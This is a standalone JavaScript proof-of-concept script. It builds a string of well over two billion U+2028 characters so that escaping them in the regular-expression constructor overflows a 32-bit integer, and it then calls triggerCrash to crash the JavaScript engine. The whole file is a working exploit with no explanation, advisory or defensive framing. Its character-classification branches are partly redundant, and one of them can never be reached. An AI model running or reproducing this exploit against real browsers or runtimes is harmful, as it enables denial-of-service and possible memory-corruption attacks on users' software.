const INT_MAX = 2147483647;

function createOverflowString(overflowBias, charToRepeat) {
  let expansionFactor = 0;
  if (charToRepeat === '\u2028' || charToRepeat === '\u2029') {
    expansionFactor = 6;
  } else if (charToRepeat === '\n' || charToRepeat === '\r' || charToRepeat === '\t' ||
    charToRepeat === '\f' || charToRepeat === '\v' || charToRepeat === '\b' ||
    (charToRepeat.length === 1 && charToRepeat.charCodeAt(0) >= 0x00 && charToRepeat.charCodeAt(0) <= 0x1F &&
      charToRepeat !== '\n' && charToRepeat !== '\r' && charToRepeat !== '\t' &&
      charToRepeat !== '\f' && charToRepeat !== '\v' && charToRepeat !== '\b')) {
    expansionFactor = 4;
  } else if (charToRepeat === '\n' || charToRepeat === '\r' || charToRepeat === '\t' ||
    charToRepeat === '\f' || charToRepeat === '\v' || charToRepeat === '\b') {
    expansionFactor = 2;
  } else {
    expansionFactor = 1;
  }

  if (expansionFactor <= 1) {
    console.warn(`Character '${charToRepeat}' is not ideal for integer overflow via escaping.`);
  }

  const minOriginalLengthForOverflow = Math.floor(INT_MAX / expansionFactor) + 1;
  const targetLength = minOriginalLengthForOverflow + overflowBias;

  const chunkSize = 10000000;
  let result = [];
  let currentLength = 0;

  while (currentLength < targetLength) {
    const remaining = targetLength - currentLength;
    const repeatCount = Math.min(remaining, chunkSize);
    try {
      result.push(charToRepeat.repeat(repeatCount));
    } catch (e) {
      console.error(`Error repeating char: ${e.message}. Current chunks: ${result.length}.`);
      throw e;
    }
    currentLength += repeatCount;
  }
  return result.join('');
}

function triggerCrash() {
  const pattern = createOverflowString(100000000, '\u2028');
  new RegExp(pattern);
}

triggerCrash();
